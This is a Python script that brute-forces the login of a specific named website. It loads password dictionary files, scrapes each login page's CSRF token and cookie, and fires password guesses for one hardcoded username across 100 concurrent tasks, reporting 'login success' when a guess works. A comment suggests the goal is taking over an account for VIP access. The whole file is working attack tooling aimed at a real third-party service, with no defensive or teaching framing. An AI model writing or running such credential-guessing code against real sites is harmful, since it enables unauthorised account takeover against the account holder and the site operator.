import re
import chardet
import datetime
import random
import math
from pathlib import Path

import aiohttp
import asyncio
import uvloop

# 永久vip
# tyvcsej


pattern = re.compile(r'name="_token" value="(.*)"')


def chunks(array: list, m: int) -> list:
    n = int(math.ceil(len(array) / float(m)))
    return [array[i: i+n] for i in range(0, len(array), n)]


def detect_encoding(file: Path):
    with file.open("rb") as f:
        data = f.read()
        encoding_info = chardet.detect(data)
    return encoding_info['encoding']


def read_password_dict(dist_dir: Path):
    content = []
    for file in dist_dir.rglob('*.txt'):
        print(file.name)
        with file.open(encoding=detect_encoding(file), errors="ignore") as f:
            content.extend(f.readlines())
    for idx, line in enumerate(content):
        content[idx] = line.replace('\n', '').strip()
    return content


async def go2login(session: aiohttp.ClientSession) -> (dict, str):
    async with session.get("https://www.trg21.com/login") as response:
        if response.status != 200:
            return None, None
        content = await response.text("utf-8")
        csrf_token = response.cookies.get("XSRF-TOKEN").value
        matches = pattern.search(content)
        token = matches.group(1)
        headers = {
            "XSRF-TOKEN": csrf_token,
            "Origin": "https://www.trg21.com",
            "Referer": "https://www.trg21.com/login"
        }
        return headers, token


async def do_login(session: aiohttp.ClientSession, headers: dict, _token: str, user_name: str, password: str) -> bool:
    data = {"username": user_name, "password": password, "_token": _token}
    async with session.post("https://www.trg21.com/login", data=data, headers=headers) as response:
        if response.status != 200:
            return None
        content = await response.text("utf-8")
        if "登录失败" in content:
            print(f"{datetime.datetime.now()}: login failed({password})")
            return False
        else:
            print(f"{datetime.datetime.now()}: login success!!! password: {password}")
            return True


async def main(password_pool, n):
    password_group = chunks(password_pool, n)

    async def task(_passwords: list) -> bool:
        session = aiohttp.ClientSession()
        for _password in _passwords:
            headers, _token = await go2login(session)
            if headers is None:
                _passwords.append(_password)
                continue
            result = await do_login(session, headers, _token, "tyvcsej", _password)
            if result is None:
                _passwords.append(_password)
                continue
            if result is True:
                return True
        else:
            return False

    for r in await asyncio.gather(*[task(passwords) for passwords in password_group]):
        if r is True:
            print("found it !!!")
            return
    else:
        print("fuck!!!")


if __name__ == "__main__":
    passwords_pool = read_password_dict(Path("./password_dict"))
    random.shuffle(passwords_pool)

    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main(passwords_pool, 100))
    loop.close()
